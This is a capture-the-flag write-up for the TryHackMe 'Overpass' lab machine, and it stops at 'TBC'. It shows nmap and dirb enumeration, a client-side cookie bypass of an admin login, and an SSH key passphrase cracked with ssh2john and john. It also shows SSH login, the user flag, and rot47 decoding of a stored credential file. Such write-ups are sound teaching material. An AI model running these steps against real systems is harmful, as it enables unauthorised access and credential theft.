## [Overpass](https://tryhackme.com/room/overpass#)

This room has very little instructions. In fact, it only tells you, what need to find in the end.
First of all, we will start the machine and run a good old nmap scan to see whats running.

```
┌──(root㉿kali)-[~]
└─# nmap -sV -sC -n 10.10.64.141
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 09:46 UTC
Nmap scan report for 10.10.64.141
Host is up (0.0075s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
MAC Address: 02:39:94:5A:24:49 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
```
Alright, this tells us, that we can reach the machine over http and ssh. Since we don't have any clues to log in with ssh, let's look at the webpage first.
The site greets us with a short intro to their product and gives some info on the creators on an aboutus-page. There is also a download page with their product: a password manager. 
It's always a good idea to look for some common directories when attacking webpages. 
So let's do that:

```
┌──(root㉿kali)-[~]
└─# dirb http://$IP -l /usr/share/wordlists/dirb/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar 15 08:43:39 2023
URL_BASE: http://10.10.64.141/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Printing LOCATION header

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.64.141/ ----
==> DIRECTORY: http://10.10.64.141/aboutus/                                             
+ http://10.10.64.141/admin (CODE:301|SIZE:42)                                          
  (Location: '/admin/')
==> DIRECTORY: http://10.10.64.141/css/                                                 
==> DIRECTORY: http://10.10.64.141/downloads/                                           
==> DIRECTORY: http://10.10.64.141/img/                                                 
+ http://10.10.64.141/index.html (CODE:301|SIZE:0)                                      
  (Location: './')
                                                                                        
---- Entering directory: http://10.10.64.141/aboutus/ ----
+ http://10.10.64.141/aboutus/index.html (CODE:301|SIZE:0)                              
  (Location: './')
                                                                                        
---- Entering directory: http://10.10.64.141/css/ ----
+ http://10.10.64.141/css/index.html (CODE:301|SIZE:0)                                  
  (Location: './')
                                                                                        
---- Entering directory: http://10.10.64.141/downloads/ ----
+ http://10.10.64.141/downloads/index.html (CODE:301|SIZE:0)                            
  (Location: './')
+ http://10.10.64.141/downloads/src (CODE:301|SIZE:0)                                   
  (Location: 'src/')
                                                                                        
---- Entering directory: http://10.10.64.141/img/ ----
+ http://10.10.64.141/img/index.html (CODE:301|SIZE:0)                                  
  (Location: './')
                                                                                        
-----------------
END_TIME: Wed Mar 15 08:43:51 2023
DOWNLOADED: 23060 - FOUND: 7
```
Nothing too wild, but the admin page looks interesting. Remembering the aboutus page, I tried to bruteforce my way in, by using the names listed and the rockyou wordlist - but unsuccessful.
I gotta admit I was kinda stuck here. So I took a few looks around and after some time of being frustrated I wandered across the login.js script on the /admin page (kind of lying under my nose the whole time). 
The script contains this login funktion:
```
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```
As we can see in the if clause, if the credentials are correct (or at least not labeled incorrect) a cookie "SessionToken" with value "statusOrCookie" is set. In that case we don't need to find credentials to login, we can just set the cookie manually, reload the page and voilà where in :).
This page shows a message from Paradox to James and reads as follows:
>Since you keep forgetting your password, James, I've set up SSH keys for you.
>
>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
>Also, we really need to talk about this "Military Grade" encryption. - Paradox

Followed by an ssh key. With user James and the key we can try to gain ssh access.
First we create an `id_rsa` file in `~/.ssh/`. They key is also password protected, so let's run ssh2john over it to create a hash file, which we can then crack with john:
```
┌──(root㉿kali)-[~/.ssh]
└─# ssh2john id_rsa > rsa.hashes
┌──(root㉿kali)-[~/.ssh]
└─# sudo  john --wordlist=/root/Desktop/wordlists/rockyou.txt --format=SSH rsa.hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
j#####          (id_rsa)     
1g 0:00:00:00 DONE (2023-03-15 11:03) 3.225g/s 43148p/s 43148c/s 43148C/s lisa..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now login via ssh and capture the first flag:
```
┌──(root㉿kali)-[~/.ssh]
└─# ssh james@10.10.64.141  
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 15 11:09:43 UTC 2023

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.64.141
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{#######################}
```

with `ls -al` we can find a .overpass file which contains an interesting looking string. Since this room is about a password manager, this .overpass file most likely is a encrypted password. To decrypt it we first have to find out what encryption method overpass uses. by taking a look into the source code we find the following:

```
//Load the credentials from the encrypted file
func loadCredsFromFile(filepath string) ([]passListEntry, string) {
	buff, err := ioutil.ReadFile(filepath)
	if err != nil {
		fmt.Println(err.Error())
		return nil, "Failed to open or read file"
	}
	//Decrypt passwords
	buff = []byte(rot47(string(buff)))
	//Load decrypted passwords
	var passlist []passListEntry
	err = json.Unmarshal(buff, &passlist)
	if err != nil {
		fmt.Println(err.Error())
		return nil, "Failed to load creds"
	}
	return passlist, "Ok"
}

```

>buff = []byte(rot47(string(buff)))

CyberChef + Rot47 + our string = `[{"name":"System","pass":"saydrawnlyingpicture"}]`

TBC









